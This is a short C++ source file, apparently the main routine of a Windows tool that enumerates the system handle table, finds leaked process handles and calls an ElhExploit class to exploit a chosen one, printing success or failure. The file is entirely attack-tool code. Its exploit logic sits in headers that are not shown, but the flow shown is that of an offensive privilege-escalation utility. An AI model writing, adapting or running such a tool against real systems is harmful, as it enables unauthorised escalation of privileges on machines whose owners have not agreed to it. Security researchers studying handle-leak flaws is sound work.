#include <string>
#include "ElhInit.h"
#include "ElhExploit.h"

int wmain(int argc, wchar_t **argv)
{
	printBanner();

	PSYSTEM_HANDLE_INFORMATION pSystemHandleInfo = getSystemHandleInformation();
	if (pSystemHandleInfo == nullptr)
	{
		wprintf(L"[*] Failed to get system handle table.\n");
		return 1;
	}

	std::vector<HANDLE_OBJ> interestingHandles;
	findLeakedHandles(pSystemHandleInfo, interestingHandles);
	if (interestingHandles.size() == 0)
	{
		wprintf(L"[!] No interesting handles found.\n");
		return 0;
	}

	ElhExploit *elh = new ElhExploit(interestingHandles);
	if (!elh->selectionValid())
	{
		wprintf(L"[!] Invalid selection.\n");
		return 1;
	}

	if (!elh->exploitHandle())
	{
		wprintf(L"[!] Failed to exploit handle.\n");
	}
	else
	{
		wprintf(L"[+] Success!\n");
	}

	delete elh;

	return 0;
}